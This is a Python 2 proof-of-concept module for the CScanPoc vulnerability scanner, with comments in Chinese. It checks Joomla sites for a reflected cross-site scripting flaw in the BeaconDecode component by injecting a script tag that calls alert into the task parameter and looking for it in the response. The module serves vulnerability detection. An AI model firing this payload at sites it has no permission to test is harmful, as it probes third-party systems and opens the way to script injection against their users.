# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Joomla_0104' # 平台漏洞编号，留空
    name = 'Joomla BeaconDecode 跨站脚本' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-10-29'  # 漏洞公布时间
    desc = '''
    Joomla BeaconDecode 跨站脚本漏洞
    Vulnerable File: index.php?option=com_beacondecode&task=
    ''' # 漏洞描述
    ref = 'https://www.yascanner.com/#!/x/19498' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0e207d3b-aa88-4352-b69f-5d4873ffb4aa' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = '/index.php?option=com_beacondecode&task="/><script>alert(233)</script>'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if '"/><script>alert(233)</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()